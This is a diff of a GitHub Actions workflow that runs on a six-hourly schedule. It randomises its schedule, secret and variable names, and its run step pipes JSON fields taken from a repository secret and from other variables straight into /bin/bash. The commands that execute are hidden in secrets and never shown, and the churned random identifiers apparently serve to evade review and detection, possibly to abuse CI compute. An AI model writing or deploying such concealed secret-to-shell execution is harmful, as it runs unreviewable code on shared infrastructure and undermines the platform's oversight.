@@ -2,25 +2,23 @@ name: lujingxi3456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 0/6 * * *'
+    - cron: '49 5/6 * * *'
 
-jobs:  # 8410
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lujingxi3456
         env:
-          s48763: ${{ secrets.s48763 }}
+          qyaln82914: ${{ secrets.qyaln82914 }}
         run: |
-          echo $s48763 | jq -r .rmpey7108 | /bin/bash
-          echo $yx0 | jq -r .ess25 | /bin/bash
-          echo $bd46140 | jq -r .aaqd3 | /bin/bash
-          echo $eo43493 | jq -r .dw1 | /bin/bash
-          echo $a73455 | jq -r .me9 | /bin/bash
-          echo $ntr87 | jq -r .vzitg69 | /bin/bash
-          echo $a90 | jq -r .w34681 | /bin/bash
-          echo $zmeeb05 | jq -r .h26938 | /bin/bash
-          echo $rvb11477 | jq -r .qcvr5 | /bin/bash
+          echo $qyaln82914 | jq -r .xe345 | /bin/bash
+          echo $as4 | jq -r .q71 | /bin/bash
+          echo $yny093 | jq -r .vi4 | /bin/bash
+          echo $uxzg6653 | jq -r .mgf17373 | /bin/bash
+          echo $kdyja7 | jq -r .xeqxi74 | /bin/bash
+          echo $yaf33692 | jq -r .speu261 | /bin/bash
+          echo $bfg85 | jq -r .zp7127 | /bin/bash
+          echo $yjlvo7350 | jq -r .b9459 | /bin/bash
 
